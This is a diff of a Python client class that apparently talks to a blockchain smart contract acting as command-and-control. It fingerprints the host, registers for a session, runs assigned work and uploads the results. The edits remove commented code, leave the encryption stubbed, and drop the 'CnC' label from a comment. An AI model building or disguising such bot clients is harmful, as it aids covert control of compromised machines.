@@ -37,7 +37,7 @@ class ClientCommands:
 
 		self.waitForNodeToSync()
 
-		# load CnC contract
+		# load contract
 		self.contract = self.loadContract()
 		time.sleep(5)
 		self.ownerPubKey = self.contract.ownerPubKey()
@@ -72,9 +72,6 @@ class ClientCommands:
 		if self.registered():
 			return True
 
-		# currBlock = self.web3.eth.blockNumber
-		# filter = self.web3.eth.filter({'from': self.address, 'fromBlock': currBlock})
-
 		try:
 			machineId = OsInteractions.fingerprintMachine()
 			machineIdEnc = self.encryptMessageForServer(machineId)
@@ -93,29 +90,11 @@ class ClientCommands:
 				self.sessionId = self.decryptMessageFromServer(sessionId)
 				l.info('Successful registration! SessionId:', self.sessionId)
 
-
-			# def callback(tx):
-			# 	sessionId = getLogEventArg(tx, eventABI, 'sessionId')
-			# 	self.sessionId = self.decryptMessageFromServer(sessionId)
-			# 	l.info('Successful registration! SessionId:', self.sessionId)
-			# 	self.commandFilter.stopWatching()
-            #
-			# self.commandFilter.watch(callback)
-			# waitForTransaction(self.commandFilter)
-			# logs = waitFor(lambda: filter.get(True), emptyResponse=[], pollInterval=1, maxRetries=30)
-            #
-			# self.web3.eth.uninstallFilter(filter.filter_id)
-            #
-			# self.sessionId = bytesToHexString(self.getLogData(REGISTRATION_EVENT_NAME, logs)[0]['args']['sessionId'])
-			# l.info('Successful registration! SessionId:', self.sessionId)
 		except Exception as e:
 			l.error("Error in returned log event:", e)
 			self.sessionId = None
 
 		return self.registered()
-
-
-
 
 
 	def doWork(self, work):
@@ -131,12 +110,14 @@ class ClientCommands:
 		self.contract.uploadWorkResults(sessionAndMachineIdHash, workResults, cmdId, transact={'from': self.address, 'gas': 3000000})
 
 	def decryptMessageFromServer(self, msg, encrypt=True):
+		# TODO compelete
 		# if encrypt:
 		# 	alice = pyelliptic.ecc()
 		# 	msg = alice.encrypt(msg,self.ownerPubKey)
 		return msg
 
 	def encryptMessageForServer(self, msg, decrypt = True):
+		# TODO compelete
 		# if decrypt:
 		# 	bob = pyelliptic.ecc()
 		# 	bob.decrypt()
@@ -258,9 +239,7 @@ if __name__ == "__main__":
 	cc = ClientCommands(confFile)
 
 	cc.mainLoop()
-	# cc.registerInstance()
-
-	#print ("wallet:",cc.walletAddress, "sessionId", cc.sessionId, "machineId:",cc.machineId)
+	
 
 
 
